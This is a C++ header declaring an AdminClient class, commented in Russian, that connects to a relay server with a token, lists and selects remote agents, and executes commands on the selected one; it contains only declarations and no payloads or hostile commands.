#pragma once

#include <string>
#include <vector>
#include "../common/protocol.h"

class AdminClient {
public:
    AdminClient();
    ~AdminClient();
    
    // Подключение к relay серверу
    bool connect(const std::string& host, uint16_t port, const std::string& token);
    
    // Отключение
    void disconnect();
    
    // Получение списка агентов
    std::vector<Protocol::AgentInfo> listAgents();
    
    // Выбор агента для управления
    bool selectAgent(const std::string& agent_id);
    
    // Выполнение команды на выбранном агенте
    std::string executeCommand(const std::string& command);
    
    // Текущий выбранный агент
    std::string getSelectedAgent() const { return m_selected_agent; }
    
    bool isConnected() const { return m_socket >= 0; }

private:
    bool sendAll(const uint8_t* data, size_t size);
    bool recvAll(uint8_t* data, size_t size);
    bool sendPacket(uint8_t msg_type, const std::string& payload);
    bool recvPacket(Protocol::PacketHeader& header, std::vector<uint8_t>& payload);
    
    int m_socket;
    std::string m_selected_agent;
};

